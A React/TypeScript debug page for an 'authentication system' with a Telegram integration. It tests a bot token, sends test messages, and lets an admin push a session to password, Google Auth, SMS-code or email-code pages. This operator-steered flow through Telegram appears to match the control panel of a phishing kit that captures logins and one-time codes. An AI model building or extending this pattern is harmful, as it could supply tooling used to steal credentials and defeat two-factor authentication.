import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  testTelegramConfig,
  sendTestMessageToTelegram,
  createDebugInfo,
} from "@/lib/debug-helper";
import { showAdminButtons } from "@/lib/telegram-service-enhanced";
import { getTelegramCallbackStatus } from "@/lib/telegram-callback-service";

const Debug = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [results, setResults] = useState<any>(null);
  const [callbackStatus, setCallbackStatus] = useState<any>(null);

  const debugInfo = createDebugInfo();

  // Update callback status periodically
  useEffect(() => {
    const updateStatus = () => {
      setCallbackStatus(getTelegramCallbackStatus());
    };

    updateStatus();
    const interval = setInterval(updateStatus, 2000);

    return () => clearInterval(interval);
  }, []);

  const handleTestConfig = async () => {
    setIsLoading(true);
    const result = await testTelegramConfig();
    setResults({ type: "config", data: result });
    setIsLoading(false);
  };

  const handleSimulateAdminClick = (action: string) => {
    const sessionId = sessionStorage.getItem("sessionId");

    if (!sessionId) {
      alert(
        "❌ No active session found. Please complete authentication flow first.",
      );
      return;
    }

    // Navigate directly (simulating what would happen when admin clicks)
    switch (action) {
      case "password":
        window.location.href = `/auth-password`;
        break;
      case "google":
        window.location.href = `/auth-google`;
        break;
      case "sms":
        window.location.href = `/auth-sms`;
        break;
      case "email":
        window.location.href = `/auth-email`;
        break;
      default:
        alert(`⚠️ Unknown action: ${action}`);
    }
  };

  const handleSendTestMessage = async () => {
    setIsLoading(true);
    const result = await sendTestMessageToTelegram(
      "🧪 <b>Test message</b>\n\nThis is a test message from the authentication system debug page.",
    );
    setResults({ type: "message", data: result });
    setIsLoading(false);
  };

  const handleTestAdminButtons = async () => {
    setIsLoading(true);
    const sessionId = sessionStorage.getItem("sessionId");

    if (!sessionId) {
      setResults({
        type: "buttons",
        data: {
          success: false,
          error:
            "No active session found. Please complete authentication flow first.",
        },
      });
      setIsLoading(false);
      return;
    }

    try {
      const success = await showAdminButtons(sessionId);
      setResults({
        type: "buttons",
        data: {
          success,
          sessionId,
          message: success
            ? "Admin buttons displayed"
            : "Failed to show buttons",
        },
      });
    } catch (error) {
      setResults({
        type: "buttons",
        data: {
          success: false,
          error: error instanceof Error ? error.message : String(error),
        },
      });
    }

    setIsLoading(false);
  };

  return (
    <div
      style={{
        padding: "20px",
        maxWidth: "800px",
        margin: "0 auto",
        fontFamily: "monospace",
      }}
    >
      <h1 style={{ marginBottom: "20px" }}>🔧 Debug - Telegram Integration</h1>

      {/* Configuration Info */}
      <div
        style={{
          backgroundColor: "#f5f5f5",
          padding: "16px",
          borderRadius: "8px",
          marginBottom: "20px",
        }}
      >
        <h3>📋 Configuration</h3>
        <pre style={{ margin: 0, fontSize: "12px" }}>
          {JSON.stringify(debugInfo, null, 2)}
        </pre>
      </div>

      {/* Callback Service Status */}
      {callbackStatus && (
        <div
          style={{
            backgroundColor: callbackStatus.isPolling ? "#d4edda" : "#f8d7da",
            padding: "16px",
            borderRadius: "8px",
            marginBottom: "20px",
            border: `1px solid ${callbackStatus.isPolling ? "#c3e6cb" : "#f5c6cb"}`,
          }}
        >
          <h3>🔄 Callback Service Status</h3>
          <pre style={{ margin: 0, fontSize: "12px" }}>
            {JSON.stringify(callbackStatus, null, 2)}
          </pre>
        </div>
      )}

      {/* Test Buttons */}
      <div style={{ display: "flex", gap: "12px", marginBottom: "20px" }}>
        <Button
          onClick={handleTestConfig}
          disabled={isLoading}
          style={{ backgroundColor: "#007bff" }}
        >
          {isLoading ? "Testing..." : "Test Bot Configuration"}
        </Button>

        <Button
          onClick={handleSendTestMessage}
          disabled={isLoading || !debugInfo.isConfigValid}
          style={{ backgroundColor: "#28a745" }}
        >
          {isLoading ? "Sending..." : "Send Test Message"}
        </Button>

        <Button
          onClick={handleTestAdminButtons}
          disabled={isLoading || !debugInfo.isConfigValid}
          style={{ backgroundColor: "#ffc107", color: "#000" }}
        >
          {isLoading ? "Testing..." : "Test Admin Buttons"}
        </Button>
      </div>

      {/* Simulate Admin Actions */}
      <div style={{ marginBottom: "20px" }}>
        <h3>🎭 Simulate Admin Actions</h3>
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fit, minmax(150px, 1fr))",
            gap: "8px",
          }}
        >
          <Button
            onClick={() => handleSimulateAdminClick("password")}
            style={{ backgroundColor: "#6c757d" }}
          >
            🔒 Password
          </Button>
          <Button
            onClick={() => handleSimulateAdminClick("google")}
            style={{ backgroundColor: "#dc3545" }}
          >
            📱 Google Auth
          </Button>
          <Button
            onClick={() => handleSimulateAdminClick("sms")}
            style={{ backgroundColor: "#28a745" }}
          >
            💬 SMS Code
          </Button>
          <Button
            onClick={() => handleSimulateAdminClick("email")}
            style={{ backgroundColor: "#17a2b8" }}
          >
            📧 Email Code
          </Button>
        </div>
      </div>

      {/* Results */}
      {results && (
        <div
          style={{
            backgroundColor: results.data.success ? "#d4edda" : "#f8d7da",
            padding: "16px",
            borderRadius: "8px",
            border: `1px solid ${results.data.success ? "#c3e6cb" : "#f5c6cb"}`,
          }}
        >
          <h3>
            {results.type === "config" && "🔍 Config Test"}
            {results.type === "message" && "📨 Message Test"}
            {results.type === "buttons" && "🎛️ Admin Buttons Test"} Results
          </h3>
          <pre style={{ margin: 0, fontSize: "12px", whiteSpace: "pre-wrap" }}>
            {JSON.stringify(results.data, null, 2)}
          </pre>
        </div>
      )}

      {/* Help */}
      <div
        style={{
          marginTop: "30px",
          padding: "16px",
          backgroundColor: "#e9ecef",
          borderRadius: "8px",
        }}
      >
        <h3>📖 Help</h3>
        <ul style={{ fontSize: "14px", lineHeight: "1.6" }}>
          <li>
            <strong>Test Bot Configuration:</strong> Checks if your Telegram bot
            token is valid
          </li>
          <li>
            <strong>Send Test Message:</strong> Sends a test message to your
            Telegram chat
          </li>
          <li>
            If tests fail, check your <code>.env</code> file configuration
          </li>
          <li>
            Bot Token format:{" "}
            <code>VITE_TELEGRAM_BOT_TOKEN=123456:ABC-DEF...</code>
          </li>
          <li>
            Chat ID format: <code>VITE_TELEGRAM_CHAT_ID=-1001234567890</code>
          </li>
        </ul>
      </div>

      {/* Back to App */}
      <div style={{ marginTop: "20px", textAlign: "center" }}>
        <Button onClick={() => (window.location.href = "/")} variant="outline">
          🏠 Back to Main App
        </Button>
      </div>
    </div>
  );
};

export default Debug;
